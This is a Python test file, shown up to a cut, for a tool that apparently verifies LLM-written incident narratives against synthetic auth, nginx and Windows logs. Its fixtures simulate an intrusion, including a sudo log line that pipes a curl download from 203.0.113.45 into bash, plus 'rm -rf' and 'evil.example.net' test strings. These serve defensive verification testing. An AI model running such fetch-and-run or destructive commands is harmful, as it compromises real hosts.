import json
import random
import re
import shutil
from datetime import datetime, timezone
from pathlib import Path

import pytest

from evidenceweave import cli
from evidenceweave import schema as S
from evidenceweave.correlation.engine import correlate_case, write_outputs
from evidenceweave.generator.core import generate
from evidenceweave.narrator import llm as llm_mod
from evidenceweave.narrator.llm import LLMResult, parse_sentences
from evidenceweave.narrator.narrate import narrate_chain
from evidenceweave.narrator.packs import load_events
from evidenceweave.parsers.pipeline import load_hosts, write_events
from evidenceweave.schema import Event
from evidenceweave.verifier import semantics
from evidenceweave.verifier import verdicts as V
from evidenceweave.verifier.baseline_verify import verify_baseline
from evidenceweave.verifier.corruption import GENERATORS, TYPES, Base, candidates, make_env, run_corruption, select
from evidenceweave.verifier.entities import Facts, build_pool, check_entities
from evidenceweave.verifier.judge import Judge, judge_prompt, parse_verdict
from evidenceweave.verifier.repair import VerifyConfig, verify_chain
from evidenceweave.verifier.semantics import CLAIM_TABLE, check_semantics
from evidenceweave.verifier.structure import check_structure, normalize
from evidenceweave.verifier.verify import (UnitCtx, Verifier, entity_coverage, load_case_data, needs_judge, rates)

PFX = {"auth": "AUTH", "nginx": "NGX", "windows": "WIN"}


# ---------------- hand-made events ----------------
def hev(n, action, hms, host="web01", user=None, ip=None, raw=None, src="auth", **extra):
    h, m, s = map(int, hms.split(":"))
    ts = datetime(2026, 10, 27, h, m, s, tzinfo=timezone.utc)
    return Event(f"{PFX[src]}-L{n}", ts, ts, False, host, user, ip, None, src, action, "f", n,
                 raw or f"{hms} {host} line {n}", extra)


A_OK = hev(1, S.SSH_LOGIN_SUCCESS, "02:15:05", user="deploy", ip="203.0.113.45",
           raw="Oct 27 02:15:05 web01 sshd[9]: Accepted password for deploy from 203.0.113.45 port 5555 ssh2")
A_FAIL = hev(2, S.SSH_LOGIN_FAILED, "02:14:00", user="root", ip="203.0.113.45",
             raw="Oct 27 02:14:00 web01 sshd[8]: Failed password for root from 203.0.113.45 port 4444 ssh2")
A_SUDO = hev(3, S.SUDO_COMMAND, "02:25:05", user="deploy", command="curl -s http://203.0.113.45:8080/x.sh | bash",
             raw="Oct 27 02:25:05 web01 sudo: deploy : COMMAND=/bin/bash -c 'curl -s http://203.0.113.45:8080/x.sh | bash'")
W_LOGON = hev(4, S.WIN_LOGON_SUCCESS, "03:02:38", host="ws1", user="svc", ip="10.0.0.55", src="windows", LogonType="3",
              raw='{"TimeCreated": "2026-10-27T03:02:38.288Z", "EventID": 4624, "Computer": "ws1"}')
W_PRIV = hev(5, S.WIN_SPECIAL_PRIVILEGES, "03:02:38", host="ws1", user="svc", src="windows",
             raw='{"TimeCreated": "2026-10-27T03:02:38.291Z", "EventID": 4672, "Computer": "ws1"}')
EVENTS = {e.event_id: e for e in (A_OK, A_FAIL, A_SUDO, W_LOGON, W_PRIV)}
ALLOWED = set(EVENTS)
HOSTS = ["web01", "ws1"]


def ctx(allowed=None, numbers=(), times=(), text=""):
    return UnitCtx("st", "stage", set(allowed if allowed is not None else ALLOWED),
                   Facts(set(times), set(numbers), text))


def verifier(max_cites=8):
    return Verifier(EVENTS, HOSTS, max_cites)


def det(text, cites, **kw):
    return verifier().det(kw.pop("ctx", ctx()), text, cites, 0, 0, "llm", False), kw


def codes(v, layer=None):
    rs = (v.layer_results[layer]["reasons"] if layer else v.failures())
    return [r["code"] for r in rs if r["code"] != V.NORMALIZED]


# ================= 1. structure =================
def test_normalize_junk_and_markdown():
    assert normalize("- The deploy user ran it.'''., ") == "The deploy user ran it."
    assert normalize("**Bold** claim   here.") == "Bold claim here."
    assert normalize("'''Quoted start. ") == "Quoted start."
    assert normalize('He ran "ls -la".') == 'He ran "ls -la".'  # balanced quotes are kept
    assert normalize("It stayed.\"") == "It stayed."  # dangling quote after the full stop


def test_structure_inline_ids_moved_and_cleaned():
    norm, cites, lr = check_structure("Logon seen (Event IDs: AUTH-L1, AUTH-L2) on web01.", [], ALLOWED, EVENTS, 8)
    assert norm == "Logon seen on web01." and cites == ["AUTH-L1", "AUTH-L2"] and lr["passed"]
    assert any(r["code"] == V.NORMALIZED for r in lr["reasons"])
    norm, cites, lr = check_structure("It happened (cites: WIN-L4) twice [AUTH-L1].", ["AUTH-L1"], ALLOWED, EVENTS, 8)
    assert cites == ["AUTH-L1", "WIN-L4"] and "L4" not in norm and "AUTH" not in norm and lr["passed"]
    norm, cites, _ = check_structure("See AUTH-L3 for details.", [], ALLOWED, EVENTS, 8)
    assert cites == ["AUTH-L3"] and norm == "See for details."


def test_structure_inline_ids_failures():
    _, _, lr = check_structure("Seen at AUTH-L999 today.", ["AUTH-L1"], ALLOWED, EVENTS, 8)
    assert [r["code"] for r in lr["reasons"] if r["code"] != V.NORMALIZED] == [V.CITE_UNKNOWN_ID]
    _, _, lr = check_structure("Seen at AUTH-L3 today.", ["AUTH-L1"], {"AUTH-L1"}, EVENTS, 8)
    assert [r["code"] for r in lr["reasons"]] == [V.INLINE_ID_NOT_ALLOWED]
    norm, _, _ = check_structure("Seen at AUTH-L3 today.", ["AUTH-L1"], {"AUTH-L1"}, EVENTS, 8)
    assert "AUTH-L3" in norm  # a failing inline ID is left visible, not silently removed


def test_structure_basic_failures():
    c = lambda text, cites, allowed=ALLOWED, mx=8: [r["code"] for r in check_structure(text, cites, allowed, EVENTS, mx)[2]["reasons"]
                                                     if r["code"] != V.NORMALIZED]
    assert c("   ***  ", ["AUTH-L1"]) == [V.EMPTY_TEXT]
    assert c("A claim.", []) == [V.NO_CITES]
    assert c("A claim.", ["AUTH-L1"], allowed={"AUTH-L2"}) == [V.CITE_NOT_ALLOWED]
    assert c("A claim.", ["AUTH-L77"]) == [V.CITE_UNKNOWN_ID]
    assert c("A claim.", ["AUTH-L1", "AUTH-L2", "AUTH-L3"], mx=2) == [V.TOO_MANY_CITES]
    assert c("A claim.", ["AUTH-L1"], allowed=None) == []  # baseline: existence only


# ================= 2. entity grounding =================
def pool(events=(A_OK, A_SUDO), numbers=("36",), times=(), text=""):
    return build_pool(list(events), Facts(set(times), set(numbers), text))


def ent(text, **kw):
    hosts = kw.pop("hosts", HOSTS)
    return [r["code"] for r in check_entities(text, pool(**kw), hosts)["reasons"]]


def test_ip_checks():
    assert ent("Connection from 10.0.0.512 was seen.") == [V.MALFORMED_IP]
    assert ent("Connection from 192.168.1 .0.5 was seen.") == [V.MALFORMED_IP]
    assert ent("Connection from 203.0.113.4.5 was seen.") == [V.MALFORMED_IP]
    assert ent("Connection from 203.0113.45 was seen.") == [V.MALFORMED_IP]
    assert ent("Connection from 203.0.113.45 was seen.") == []
    assert ent("Connection from 8.8.4.4 was seen.") == [V.IP_NOT_GROUNDED]
    assert ent("Connection from 203.0.113.4 was seen.") == [V.IP_NOT_GROUNDED]  # prefix of a grounded IP
    assert V.MALFORMED_IP not in ent("The ratio was 0.6 on 3.5 average.")  # decimals are numbers, not IP-like


def test_time_checks():
    assert ent("It happened at 02:15:05.") == []
    assert ent("It happened at 2026-10-27T02:15:05Z.") == []
    assert ent("It happened at 2026-10-27 02:15:05.123.") == []
    assert ent("It happened at 3:15:05.") == [V.TIME_NOT_GROUNDED]
    assert ent("It happened at 2026-10-27T02:15:06Z.") == [V.TIME_NOT_GROUNDED]
    assert ent("From 02:00:00 to 02:30:00.", times=["2026-10-27T02:00:00Z", "2026-10-27T02:30:00Z"]) == []
    assert ent("It was 02:25:05 UTC.") == []  # syslog time from raw_text


def test_number_checks():
    assert ent("There were 36 failures.") == []
    assert ent("There were 37 failures.") == [V.NUMBER_NOT_GROUNDED]
    assert ent("Only 0 or 1 of them, plus web01 and port 5555.") == []  # 0/1 ignored, glued digits ignored, port in raw
    assert ent("From 203.0.113.45 at 02:15:05 with 36.") == []  # numbers inside IPs/times are not misjudged
    assert ent("Event AUTH-L1 and AUTH-L999 were seen.") == []  # IDs are not numbers
    assert ent("Three events.") == []  # number words are not checked


def test_url_user_host_command_checks():
    assert ent("It fetched http://203.0.113.45:8080/x.sh quickly.") == []
    assert ent("It fetched http://evil.example.net/a.sh quickly.") == [V.URL_NOT_GROUNDED]
    assert ent("It resolved evil.example.net quickly.") == [V.URL_NOT_GROUNDED]
    assert ent("The login was as deploy there.") == []
    assert ent("The login was as mallory there.") == [V.USER_NOT_GROUNDED]
    assert ent("The user 'oscar' appeared.") == [V.USER_NOT_GROUNDED]
    assert ent("This happened as part of the run; the user logged in.") == []
    assert ent("The account was created as recorded; users suggest it.") == []  # prose after user/as is not a name
    assert ent("The login was as 'recorded' there.") == [V.USER_NOT_GROUNDED]  # quoted names are always checked
    assert ent("Activity on web01 only.") == []
    assert ent("Activity on ws1 only.", events=(A_OK,)) == [V.HOST_NOT_GROUNDED]
    assert ent("It ran `curl -s http://203.0.113.45:8080/x.sh | bash` once.") == []
    assert ent('It ran "rm -rf /tmp/stuff" once.') == [V.COMMAND_NOT_GROUNDED]
    assert ent('It ran "ls" once.') == []  # short strings are not checked


# ================= 3. semantics =================
def test_semantics_privileged_and_negation():
    ok_actions, bad_actions = {S.WIN_SPECIAL_PRIVILEGES}, {S.WIN_LOGON_SUCCESS}
    t = "A successful privileged logon was seen on the host."
    r = check_semantics(t, bad_actions)
    assert not r["passed"] and r["reasons"][0]["code"] == V.SEMANTIC_MISMATCH and "privileg" in r["reasons"][0]["detail"]
    assert check_semantics(t, ok_actions | bad_actions)["passed"] is True
    assert check_semantics("No privileged logon was shown.", bad_actions)["passed"] is True
    assert check_semantics("It did not use elevated rights.", {S.WEB_REQUEST})["passed"] is True
    assert check_semantics("The host was active for a while.", {S.WEB_REQUEST})["passed"] is True
    assert check_semantics("It fetched http://203.0.113.45/a quickly.", {S.SSH_LOGIN_SUCCESS})["passed"] is True  # URL scheme is not a claim


def test_semantics_table_is_extensible():
    text = "The data was exfiltrated overnight."
    assert check_semantics(text, {S.WIN_LOGON_SUCCESS})["passed"] is True
    entry = ("exfil", re.compile(r"exfiltrat", re.I), frozenset({S.WEB_REQUEST}))
    CLAIM_TABLE.append(entry)
    try:
        assert not check_semantics(text, {S.WIN_LOGON_SUCCESS})["passed"]
        assert check_semantics(text, {S.WEB_REQUEST})["passed"]
    finally:
        CLAIM_TABLE.remove(entry)
    assert check_semantics(text, {S.WIN_LOGON_SUCCESS})["passed"] is True


# ================= 4. judge =================
class FJudgeLLM:
    """Fake judge model: handler(user) -> reply text (default: supported)."""

    def __init__(self, handler=None, model="judge-model", seq=None):
        self.handler, self.model, self.seq = handler, model, seq
        self.options, self.json_mode, self.calls = {"temperature": 0, "seed": 42, "num_ctx": 8192}, "schema", []

    def complete(self, system, user, options=None, schema=None, validator=None):
        self.calls.append(user)
        if self.seq is not None:
            self.seq.append("judge")
        if self.handler:
            text = self.handler(user)
        elif "distinct factual claims" in system:  # the claims judge: quote a real substring of the first shown log line
            line = next((l for l in user.splitlines() if re.match(r"(?:AUTH|NGX|WIN)-L\d+ \| ", l)), "")
            quote = line.split(" | ", 2)[2][:12] if line.count(" | ") >= 2 else ""
            text = json.dumps({"claims": [{"claim": "c", "supported": True, "quote": quote}], "verdict": "supported", "reason": "shown"})
        else:
            text = '{"verdict": "supported", "reason": "shown"}'
        return LLMResult(True, text, None, 0.0, "schema")


def test_judge_parses_and_retries():
    for verdict in ("supported", "partial", "unsupported"):
        j = Judge(FJudgeLLM(lambda u, v=verdict: json.dumps({"verdict": v, "reason": "r"})))
        assert j.judge("S.", [A_OK])["verdict"] == verdict
    seen = []

    def flaky(u):
        seen.append(u)
        return "nonsense" if len(seen) == 1 else '{"verdict": "supported", "reason": "ok"}'

    fake = FJudgeLLM(flaky)
    out = Judge(fake).judge("S.", [A_OK])
    assert out["verdict"] == "supported" and out["attempts"] == 2 and "Reminder" in fake.calls[1]
    bad = FJudgeLLM(lambda u: "still nonsense")
    out = Judge(bad).judge("S.", [A_OK])
    assert out["verdict"] == "judge_error" and out["attempts"] == 2 and len(bad.calls) == 2
    assert parse_verdict('{"verdict": "maybe", "reason": "x"}') is None


def test_judge_error_and_non_supported_are_not_accepted():
    vr = verifier()
    for reply, code in (('{"verdict":"partial","reason":"x"}', V.JUDGE_PARTIAL),
                        ('{"verdict":"unsupported","reason":"x"}', V.JUDGE_UNSUPPORTED), ("garbage", V.JUDGE_ERROR)):
        v = vr.det(ctx(), "A login from 203.0.113.45 was seen.", ["AUTH-L1"], 0, 0, "llm", True)
        assert needs_judge(v)
        vr.apply_judge(Judge(FJudgeLLM(lambda u, r=reply: r)), ctx(), v)
        assert v.accepted is False and v.codes() == [code]
    v = vr.det(ctx(), "A login from 203.0.113.45 was seen.", ["AUTH-L1"], 0, 0, "llm", True)
    vr.apply_judge(Judge(FJudgeLLM()), ctx(), v)
    assert v.accepted and v.judge["verdict"] == "supported" and v.judge["model"] == "judge-model"


def test_judge_prompt_contains_only_sentence_cited_lines_and_summaries():
    p = judge_prompt("The deploy user logged in.", [A_OK])
    assert "The deploy user logged in." in p and A_OK.raw_text in p and "AUTH-L1" in p
    for other in (A_FAIL, A_SUDO, W_LOGON):
        assert other.raw_text not in p and other.event_id not in p
    assert "SUMMARIES" not in p
    p2 = judge_prompt("Exec sentence.", [A_OK], ["stage a: did x", "stage b: did y"])
    assert "stage a: did x" in p2 and "stage b: did y" in p2 and A_FAIL.raw_text not in p2
    many = [hev(100 + i, S.WEB_REQUEST, "01:00:00") for i in range(20)]
    p3 = judge_prompt("S.", many, max_events=12)
    assert p3.count(" | ") >= 24 and "8 more cited lines omitted" in p3 and many[0].event_id in p3 and many[-1].event_id in p3


def test_judge_only_runs_on_deterministically_passing_sentences():
    vr, calls = verifier(), FJudgeLLM()
    good = vr.det(ctx(), "A login from 203.0.113.45 was seen.", ["AUTH-L1"], 0, 0, "llm", True)
    bad = vr.det(ctx(), "A login from 10.0.0.512 was seen.", ["AUTH-L1"], 1, 0, "llm", True)
    assert needs_judge(good) and not needs_judge(bad)
    assert bad.layer_results["judge"]["passed"] == "skipped" and not bad.accepted


# ================= shared fixtures for repair-loop tests =================
class FNarr:
    """Fake narrator: handler(system, user, call_no) -> reply text or None for a grounded default reply."""

    def __init__(self, handler=None, model="narrator-model", seq=None):
        self.handler, self.model, self.seq, self.calls = handler, model, seq, []
        self.options, self.json_mode = {"temperature": 0, "seed": 42, "num_ctx": 16384}, "schema"

    def complete(self, system, user, options=None, schema=None, validator=None):
        self.calls.append(user)
        if self.seq is not None:
            self.seq.append("narrator")
        text = self.handler(system, user, len(self.calls)) if self.handler else None
        text = text if text is not None else good(user)
        parsed = parse_sentences(text)
        return LLMResult(parsed is not None, text, parsed, 0.0, "schema")


EVS = {}


def allowed_of(user):
    m = re.search(r"ALLOWED CITE IDS: (.*)", user)
    return m.group(1).split(", ") if m else [re.search(r"(?:AUTH|NGX|WIN)-L\d+", user).group(0)]  # baseline prompts


def good(user, n_sent=1):
    a = allowed_of(user)
    e = EVS[a[0]]
    s = {"text": f"The first logged event of this part of the incident occurred at {e.timestamp:%H:%M:%S} on {e.host}.",
         "cites": [a[0]]}
    return json.dumps({"sentences": [s] * 1 if n_sent == 1 else [s, {**s, "text": s["text"].replace("first", "next")}]})


def bad(user):
    return json.dumps({"sentences": [{"text": "The activity came from 10.0.0.512 at that time.", "cites": [allowed_of(user)[0]]}]})


def stage_of(user):
    m = re.search(r"^STAGE: (\w+)", user, re.M)
    return m.group(1) if m else ("executive_summary" if "ATTACK CHAIN, IN ORDER" in user else None)


def fb(user):
    return "REPAIR FEEDBACK" in user


@pytest.fixture(scope="module")
def prepared(tmp_path_factory):
    root = tmp_path_factory.mktemp("v")
    generate("case01", "easy", 42, root / "cases")
    generate("case02", "hard", 7, root / "cases")
    out = root / "out"
    for c in ("case01", "case02"):
        case, findings, chain = correlate_case(root / "cases" / c)
        write_outputs(case.name, findings, chain, out)
        write_events(case, out / c / "events.jsonl")
    return root


def run_verify(prepared, tmp_path, name="case01", handler=None, judge_handler=None, max_retries=2, use_judge=True,
               narr_model="narrator-model", judge_model="judge-model", max_cites=8):
    d = tmp_path / name
    shutil.copytree(prepared / "out" / name, d)
    EVS.clear()
    EVS.update(load_events(d / "events.jsonl"))  # both cases reuse IDs like AUTH-L1: look up the current case only
    seq = []
    narr = FNarr(handler, narr_model, seq)
    narrate_chain(d, narr)
    narr.calls.clear()
    seq.clear()
    data = load_case_data(d, load_hosts(prepared / "cases" / name))
    jllm = FJudgeLLM(judge_handler, judge_model, seq)
    msgs = []
    res = verify_chain(data, narr, Judge(jllm) if use_judge else None, VerifyConfig(max_retries, max_cites, use_judge),
                       progress=msgs.append)
    return res, narr, jllm, seq, data, msgs


def stage_entry(res, stage):
    return next(s for s in res["verified"]["stages"] if s["stage"] == stage)


# ================= 5. repair loop =================
def test_stage_fails_then_passes_after_one_repair(prepared, tmp_path):
    h = lambda s, u, n: bad(u) if stage_of(u) == "persistence" and not fb(u) else None
    res, narr, jllm, seq, data, _ = run_verify(prepared, tmp_path, handler=h)
    st = stage_entry(res, "persistence")
    assert st["attempts_used"] == 2 and st["accepted"] == 1 and not st["fallback"] and st["sentences"][0]["attempt"] == 1
    assert len(narr.calls) == 1  # every other stage passed first time: no extra narrator calls
    prompt = narr.calls[0]
    assert "REPAIR FEEDBACK" in prompt and "MALFORMED_IP" in prompt and "not a valid IPv4" in prompt
    assert "10.0.0.512" in prompt and "using ONLY the evidence lines" in prompt
    rep = res["report"]
    assert rep["attempts"]["persistence"][1]["feedback_used"] is True and rep["attempts"]["persistence"][0]["feedback_used"] is False
    sr = rep["summary"]["supported_rate"]
    assert sr["before_repair"]["accepted"] == 6 and sr["before_repair"]["total"] == 7
    assert sr["before_repair"]["rate"] == round(6 / 7, 4) and sr["after_repair"]["rate"] == 1.0


def test_always_failing_stage_falls_back_to_template(prepared, tmp_path):
    h = lambda s, u, n: bad(u) if stage_of(u) == "web_recon" else None
    res, narr, *_ = run_verify(prepared, tmp_path, handler=h, max_retries=2)
    st = stage_entry(res, "web_recon")
    pack = next(p for p in res["verified"]["stages"] if p["stage"] == "web_recon")
    assert st["fallback"] and st["source"] == "template_fallback" and st["attempts_used"] == 3
    assert len(narr.calls) == 2 and res["verified"]["verification"]["fallback_units"] == ["web_recon"]
    (s,) = st["sentences"]
    assert s["source"] == "template_fallback" and "web requests" in s["text"] and len(s["cites"]) == 2
    vs = [v for v in res["report"]["verdicts"] if v["stage"] == "web_recon"]
    disp = {v["attempt"]: v["disposition"] for v in vs if v["source"] == "llm"}
    assert disp == {0: "replaced_by_fallback", 1: "dropped", 2: "dropped"}  # best (earliest) attempt vs superseded ones
    assert [v for v in vs if v["source"] == "template_fallback"][0]["accepted"]
    assert pack["allowed_cite_ids"]


def test_best_attempt_is_chosen(prepared, tmp_path):
    def h(s, u, n):
        if stage_of(u) != "initial_access":
            return None
        g, b = json.loads(good(u))["sentences"][0], json.loads(bad(u))["sentences"][0]
        return json.dumps({"sentences": [b, b] if fb(u) else [g, b]})

    res, narr, *_ = run_verify(prepared, tmp_path, handler=h, max_retries=1)
    st = stage_entry(res, "initial_access")
    assert st["attempts_used"] == 2 and st["accepted"] == 1 and st["dropped"] == 1 and not st["fallback"]
    assert len(st["sentences"]) == 1 and st["sentences"][0]["attempt"] == 0  # attempt 0 beat the all-bad repair
    ds = {(v["attempt"], v["sentence_index"]): v["disposition"] for v in res["report"]["verdicts"]
          if v["stage"] == "initial_access" and v["source"] == "llm"}
    assert ds == {(0, 0): "kept", (0, 1): "dropped", (1, 0): "dropped", (1, 1): "dropped"}


def test_batched_rounds_order_and_model_swaps(prepared, tmp_path):
    h = lambda s, u, n: bad(u) if stage_of(u) in ("persistence", "web_recon") and not fb(u) else None
    res, narr, jllm, seq, data, _ = run_verify(prepared, tmp_path, handler=h)
    log = res["report"]["call_log"]
    assert [c["kind"] for c in log] == seq  # the log is the real order of calls
    for r in (1, 2):
        kinds = [c["kind"] for c in log if c["round"] == r]
        if kinds:
            first_judge = kinds.index("judge") if "judge" in kinds else len(kinds)
            assert "narrator" not in kinds[first_judge:]  # all narrator calls of a round precede its judge calls
    r1 = [c["kind"] for c in log if c["round"] == 1]
    assert r1 == ["narrator", "narrator", "judge", "judge"]
    assert [c["kind"] for c in log if c["round"] == 0] == ["judge"] * 5  # 5 clean units reached the judge together
    assert res["report"]["summary"]["model_swaps"] == 2  # judge -> narrator -> judge
    assert sum(1 for c in log if c["kind"] == "narrator") == 2


def test_judge_independence_flag_and_warning(prepared, tmp_path):
    res, *_, msgs = run_verify(prepared, tmp_path, narr_model="same-model", judge_model="same-model")
    assert res["verified"]["verification"]["judge_independent"] is False
    assert any("WARNING" in m and "NOT independent" in m for m in msgs)
    assert res["report"]["summary"]["model_swaps"] == 0
    res2, *_ = run_verify(prepared, tmp_path / "b")
    assert res2["verified"]["verification"]["judge_independent"] is True


# ================= 6. executive summary =================
def test_executive_summary_union_pool_and_fallback(prepared, tmp_path):
    d = tmp_path / "x"
    shutil.copytree(prepared / "out" / "case01", d)
    EVS.clear()
    EVS.update(load_events(d / "events.jsonl"))
    narrate_chain(d, FNarr())
    data = load_case_data(d, load_hosts(prepared / "cases" / "case01"))
    vr = Verifier(data.events, data.host_names)
    ex = data.ctxs["executive_summary"]
    rep = sorted(ex.allowed)[0]
    ip = data.chain["attacker_entities"]["ips"][0]
    ok = vr.det(ex, f"Activity involved {ip} overall.", [rep], 0, 0, "llm", False)
    assert ok.layer_results["entities"]["passed"] is True  # grounded by the union of stage entity lists
    assert vr.det(ex, "Activity involved 8.8.4.4 overall.", [rep], 0, 0, "llm", False).codes() == [V.IP_NOT_GROUNDED]
    stage_ctx = data.ctxs["persistence"]
    assert vr.det(stage_ctx, f"Activity involved {ip} overall.", [sorted(stage_ctx.allowed)[0]], 0, 0, "llm", False)
    # an executive summary that is always garbage ends with one template sentence per stage
    h = lambda s, u, n: "garbage" if stage_of(u) == "executive_summary" else None
    res, narr, *_ = run_verify(prepared, tmp_path / "y", handler=h)
    sents = res["verified"]["executive_summary"]
    assert len(sents) == 6 and {s["source"] for s in sents} == {"template_fallback"}
    assert res["verified"]["verification"]["fallback_units"] == ["executive_summary"]
    assert not res["report"]["summary"]["template_failures"]
    assert res["verified"]["executive_summary_meta"]["fallback"] is True


# ================= 7. template sentences =================
def test_template_sections_verified_without_judge_and_never_dropped(prepared, tmp_path):
    res, narr, jllm, seq, data, msgs = run_verify(prepared, tmp_path, name="case02")
    ver = res["verified"]
    assert len(ver["attempts_only"]) == 1 and len(ver["unprovable"]) == 1
    assert all(s["verified"] and s["source"] == "template" for s in ver["attempts_only"] + ver["unprovable"])
    tv = [v for v in res["report"]["verdicts"] if v["source"] == "template"]
    assert len(tv) == 2 and all(v["judge"] is None and v["accepted"] and v["disposition"] == "kept" for v in tv)
    assert all(v["layer_results"]["judge"]["passed"] == "skipped" and v["layer_results"]["semantics"]["passed"] == "skipped"
               for v in tv)
    assert not any("attempts_only" in c["label"] or "unprovable" in c["label"] for c in res["report"]["call_log"])
    assert len(jllm.calls) == 7  # 6 stages + executive summary only
    assert not any("TEMPLATE SENTENCE FAILED" in m for m in msgs)
    assert res["report"]["summary"]["template_failures"] == []


# ================= 8. defect replay (hand-made events) =================
def test_defect_kinds_handled_by_the_intended_layer():
    c = ctx(numbers=("36",))
    vr = verifier()
    # corrupted IP with a missing dot
    v = vr.det(c, "At 02:15:05 deploy connected from 203.0113.45 after 36 failures.", ["AUTH-L1"], 0, 0, "llm", False)
    assert codes(v, "entities") == [V.MALFORMED_IP] and codes(v, "structure") == []
    # trailing junk quote run
    v = vr.det(c, "At 02:25:05 deploy ran a command via sudo '/bin/bash -c 'curl x'''., ", ["AUTH-L3"], 0, 0, "llm", False)
    assert v.text_normalized.endswith("curl x''.")  # only the ONE excess quote is junk; the two legitimate closers stay and v.layer_results["structure"]["passed"] is True
    assert any(r["code"] == V.NORMALIZED for r in v.layer_results["structure"]["reasons"])
    # "privileged logon" claim citing only a plain logon
    v = vr.det(c, "The account made a successful privileged logon on ws1.", ["WIN-L4"], 0, 0, "llm", False)
    assert codes(v, "semantics") == [V.SEMANTIC_MISMATCH]
    v = vr.det(c, "The account made a successful privileged logon on ws1.", ["WIN-L4", "WIN-L5"], 0, 0, "llm", False)
    assert codes(v, "semantics") == [] and v.accepted
    # inline IDs inside the text
    v = vr.det(c, "Failed logons (Event IDs: AUTH-L2) preceded the login (AUTH-L1) at 02:15:05.", [], 0, 0, "llm", False)
    assert v.cites_final == ["AUTH-L1", "AUTH-L2"] and "AUTH-L" not in v.text_normalized and v.layer_results["structure"]["passed"]


# ================= 9. outputs =================
def test_output_files_contain_only_accepted_sentences(prepared, tmp_path):
    h = lambda s, u, n: json.dumps({"sentences": [json.loads(good(u))["sentences"][0], json.loads(bad(u))["sentences"][0]]}) \
        if stage_of(u) == "brute_force" else None
    res, *_ = run_verify(prepared, tmp_path, handler=h, max_retries=0)
    ver, rep = res["verified"], res["report"]
    d = tmp_path / "case01"
    assert json.loads((d / "narrative_verified.json").read_text()) == ver
    assert json.loads((d / "verification_report.json").read_text()) == rep
    all_s = ver["executive_summary"] + [s for st in ver["stages"] for s in st["sentences"]]
    assert all({"text", "cites", "source", "attempt"} <= set(s) for s in all_s)
    assert not any("10.0.0.512" in s["text"] for s in all_s)  # the bad sentence is not shown...
    assert any(v["text_original"].count("10.0.0.512") and not v["accepted"] and v["disposition"] == "dropped"
               for v in rep["verdicts"])  # ...but stays visible in the report
    assert ver["verification"]["accepted_total"] == len(all_s) and ver["verification"]["dropped_total"] == 1
    sm = rep["summary"]
    assert sm["supported_rate"]["before_repair"] == {"total": 8, "accepted": 7, "rate": 0.875, "cap_only_failures": 0,
                                                     "rate_excluding_cap_only": 0.875}
    assert sm["supported_rate"]["after_repair"]["rate"] == 0.875  # no repair rounds were allowed
    assert sm["failure_code_histogram"] == {"MALFORMED_IP": 1} and sm["sentences_reaching_judge"] == 7
    assert sm["total_sentences_per_attempt"] == {"0": 8}
    assert {"layer_pass_counts", "judge_verdict_counts", "drops", "fallbacks", "seconds_per_phase", "model_swaps",
            "ablation_attempt0"} <= set(sm)


# ================= 10. baseline verification =================
def test_baseline_verification_cap_and_unknown_ids(prepared, tmp_path):
    d = tmp_path / "case01"
    shutil.copytree(prepared / "out" / "case01", d)
    data = load_case_data(d, load_hosts(prepared / "cases" / "case01"))
    ids = list(data.events)
    e = data.events[ids[0]]
    sents = [{"text": "Many events were logged.", "cites": ids[:40]},
             {"text": "Something happened.", "cites": ["AUTH-L99999"]},
             {"text": f"An event was logged at {e.timestamp:%H:%M:%S} on {e.host}.", "cites": [ids[0]]}]
    (d / "baseline_narrative.json").write_text(json.dumps({"model": "m", "sentences": sents}))
    out = verify_baseline(data, Judge(FJudgeLLM()), max_cites=8)
    by = {v["sentence_index"]: v for v in out["verdicts"]}
    assert V.TOO_MANY_CITES in [r["code"] for r in by[0]["layer_results"]["structure"]["reasons"]]
    assert [r["code"] for r in by[1]["layer_results"]["structure"]["reasons"]] == [V.CITE_UNKNOWN_ID]
    assert by[2]["accepted"] and out["sentences_reaching_judge"] == 1
    assert out["rates"] == {"total": 3, "accepted": 1, "rate": round(1 / 3, 4), "cap_only_failures": 1,
                            "rate_excluding_cap_only": 0.5}
    assert (d / "baseline_verification.json").exists() and all(v["disposition"] == "kept" for v in out["verdicts"])
    assert out["judge_mode"] == "with_judge"


def test_entity_coverage_counting(prepared):
    d = prepared / "out" / "case01"
    chain = json.loads((d / "chain.json").read_text())
    findings = json.loads((d / "findings.json").read_text())["findings"]
    cov = entity_coverage(chain, findings, {}, "Host 203.0.113.45 used deploy; 203.0.113.450 is something else.")
    kinds = {i["kind"]: i["present"] for i in cov["items"]}
    assert kinds == {"attacker_ip": True, "compromised_user": True, "payload_host": True, "pivot_host": False}
    assert (cov["present"], cov["total"]) == (3, 4)
    assert entity_coverage(chain, findings, {}, "nothing here")["present"] == 0
    assert entity_coverage(chain, findings, {}, "web01 only")["present"] == 1


def test_rates_helper_cap_only():
    vr = verifier(max_cites=1)
    a = vr.det(ctx(), "Fine.", ["AUTH-L1"], 0, 0, "llm", False)
    b = vr.det(ctx(), "Fine.", ["AUTH-L1", "AUTH-L2"], 1, 0, "llm", False)
    c = vr.det(ctx(), "Fine at 10.0.0.512.", ["AUTH-L1", "AUTH-L2"], 2, 0, "llm", False)
    r = rates([a, b, c])
    assert r["accepted"] == 1 and r["cap_only_failures"] == 1 and r["rate_excluding_cap_only"] == 0.5


# ================= 11. corruption test =================
def corruption_env(prepared, tmp_path):
    d = tmp_path / "case01"
    shutil.copytree(prepared / "out" / "case01", d)
    data = load_case_data(d, load_hosts(prepared / "cases" / "case01"))
    ia = sorted(data.ctxs["initial_access"].allowed)
    bf = sorted(data.ctxs["brute_force"].allowed)
    pe = data.pack("persistence").allowed_cite_ids
    cron_cmd = next(i for i in pe if data.events[i].action == S.CRON_COMMAND)
    bases = [Base("initial_access", 0, "At 02:15:05, a session started as deploy from 203.0.113.45 after 36 earlier failures.", ia),
             Base("brute_force", 0, "The scan began at 02:10:43 on web01.", bf[:2]),
             Base("persistence", 0, "A recurring job ran on web01.", [cron_cmd, next(i for i in pe if i != cron_cmd)])]
    return data, bases


@pytest.mark.parametrize("t", TYPES)
def test_corruption_generators_deterministic_and_effective(prepared, tmp_path, t):
    data, bases = corruption_env(prepared, tmp_path)
    cands = candidates(data, bases)[t]
    assert cands, f"{t} applicable to none of the test bases"
    again = candidates(data, bases)[t]
    assert cands == again  # deterministic for the seed
    vr = Verifier(data.events, data.host_names)
    for c in cands:
        b = next(x for x in bases if x.unit == c["unit"])
        assert (c["text"], c["cites"]) != (b.text, b.cites)
        if t in ("ip_digit_drop", "ip_swap", "time_shift", "number_change", "username_swap", "fabricated_entity",
                 "fabricated_claim_no_entity"):
            assert c["text"] != b.text and c["cites"] == b.cites
        else:
